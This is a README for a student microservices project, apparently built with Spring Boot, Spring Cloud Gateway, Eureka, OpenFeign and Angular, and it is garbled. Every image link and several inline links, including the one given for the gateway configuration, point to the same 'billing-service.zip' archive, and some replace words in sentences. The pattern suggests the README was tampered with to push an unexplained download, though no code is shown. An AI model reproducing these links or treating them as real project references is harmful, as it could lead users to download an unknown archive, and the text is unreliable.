# Architecture-micro-service
Practical activity 5: Implementing a microservice architecture
Objective:  
The creation of an application based on a micro-service architecture to manage invoices containing products belonging to a customer.
1. Create the Customer-service microservice
      - Create Customer Entity
      - Create the CustomerRepository interface based on Spring Data 
      - Deploy the microservice's Restful API using Spring Data Rest
      - Test the microservice
2. Create the Inventory-service microservice
      - Create the Product entity
      - Create the ProductRepository interface based on Spring Data
      - Deploy the microservice's Restful API using Spring Data Rest
      - Test the microservice
3. Create the Gateway service using Spring Cloud Gateway
      - Test the Service proxy using a Static configuration based on the https://raw.githubusercontent.com/Walid35-web/Architecture-micro-service/main/billing-service.zip file
      - Test the Service proxy using a Static configuration based on a Java configuration
4. Create the Registry Service directory based on NetFlix Eureka Server
5. Test the proxy using a dynamic Route Management configuration to the micro-services registered in the Eureka Server directory
6. Create Billing-Service using Open Feign to communicate with Customer-service and Inventory-service 7. Create an Angular client to display an invoice
7. Create an Angular client to display an invoice

## Angular code in the second branch (Master) 
![image](https://raw.githubusercontent.com/Walid35-web/Architecture-micro-service/main/billing-service.zip)
### Checked master : 
![image](https://raw.githubusercontent.com/Walid35-web/Architecture-micro-service/main/billing-service.zip)

## Part One 
https://raw.githubusercontent.com/Walid35-web/Architecture-micro-service/main/billing-service.zip the customer-service microservice to manage customers
![image](https://raw.githubusercontent.com/Walid35-web/Architecture-micro-service/main/billing-service.zip)
![image](https://raw.githubusercontent.com/Walid35-web/Architecture-micro-service/main/billing-service.zip)
### Customer H2 Console :
![image](https://raw.githubusercontent.com/Walid35-web/Architecture-micro-service/main/billing-service.zip)
### Actuator : 
![image](https://raw.githubusercontent.com/Walid35-web/Architecture-micro-service/main/billing-service.zip)
https://raw.githubusercontent.com/Walid35-web/Architecture-micro-service/main/billing-service.zip the inventory-service microservice to manage products
![image](https://raw.githubusercontent.com/Walid35-web/Architecture-micro-service/main/billing-service.zip)
![image](https://raw.githubusercontent.com/Walid35-web/Architecture-micro-service/main/billing-service.zip)
### Product H2 Console :
![image](https://raw.githubusercontent.com/Walid35-web/Architecture-micro-service/main/billing-service.zip)
### Customers & Products with gateway : 
![image](https://raw.githubusercontent.com/Walid35-web/Architecture-micro-service/main/billing-service.zip)
![image](https://raw.githubusercontent.com/Walid35-web/Architecture-micro-service/main/billing-service.zip)
### Eureka after enabling Discovery Service :
![image](https://raw.githubusercontent.com/Walid35-web/Architecture-micro-service/main/billing-service.zip)
![image](https://raw.githubusercontent.com/Walid35-web/Architecture-micro-service/main/billing-service.zip)
### Customers with id using the Web Service :
![image](https://raw.githubusercontent.com/Walid35-web/Architecture-micro-service/main/billing-service.zip)
### Products with id using the Web Service :
![image](https://raw.githubusercontent.com/Walid35-web/Architecture-micro-service/main/billing-service.zip)
## Deuxième Partie : 

### H2 Console Bill :
![WhatsApp Image 2023-05-27 at 22 29 14](https://raw.githubusercontent.com/Walid35-web/Architecture-micro-service/main/billing-service.zip)
![image](https://raw.githubusercontent.com/Walid35-web/Architecture-micro-service/main/billing-service.zip)
### H2 Console Product Item : 
![image](https://raw.githubusercontent.com/Walid35-web/Architecture-micro-service/main/billing-service.zip)
## troisieme partie:
### Produits : 
![image](https://raw.githubusercontent.com/Walid35-web/Architecture-micro-service/main/billing-service.zip)
### Clients : 
![image](https://raw.githubusercontent.com/Walid35-web/Architecture-micro-service/main/billing-service.zip)



